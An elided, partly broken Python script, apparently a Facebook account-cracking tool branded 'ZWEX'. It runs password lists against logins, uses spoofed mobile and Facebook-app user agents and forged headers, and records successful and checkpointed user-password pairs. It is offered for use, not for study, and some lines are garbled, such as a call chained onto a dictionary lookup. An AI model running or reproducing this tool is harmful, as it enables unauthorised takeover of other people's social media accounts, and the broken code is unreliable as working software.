...
def version():
    ...
    print(' \033[1;92m[01] \033[1;97mFile Cloning ')
    print(' \033[1;92m[02] \033[1;93mPublic Cloning ')
    print(' \033[1;92m[03] \033[1;92mCreate File ')
    print(' \033[1;92m[04] \033[1;95mSeprate Idz ')
    print(' \033[1;92m[05] \033[1;93mDouble Idz Cutter ')
    print(' \033[1;92m[06] \033[1;96mRemove Token')
    print(' \033[1;92m[00] \033[1;94mExit ')
    print('')
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;95m[ZWEX] {loop}/{len(self.id)} [OK-{len(ok)}] [CP-{len(cp)}] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[ZWEX-OK] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[ZWEX-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					...
					pass
				print('\r\033[1;91m[ZWEX-CP] %s | %s%s      ' % (user,pw,tahun(user)))
...
class __xnx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;92m[ZWEX] {loop}/{len(self.id)} OK-{len(ok)}] CP-{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                header1 = {
                    ...
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
...
baynak_ua_xaomi  = 'Mozilla/5.0 (Linux; Android 11; A600DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
baynak_ua_nokia   = 'Mozilla/5.0 (Linux; Android 7.0; A10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36+'
baynak_ua_asus    = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/13.5.1 Safari/605.1.15 AlohaBrowser/2.21.3 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
baynak_ua_huawei  = 'Mozilla/5.0 (Linux; Android 9; ANE-LX3; HMSCore 5.0.3.304; GMSCore 20.36.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 HuaweiBrowser/11.0.2.302 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
baynak_ua_vivo    = 'Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
...
\033[1;32m [+] Author  : NAZIR
\033[1;32m [+] Fb ID   : ZWEX
\033[1;32m [+] Version : 5.0
\033[1;32m [+] Github  : https://github.com/GITHUB
\033[1;33m__________________________________________________
"""
ct = datetime.now()
n = ct.month
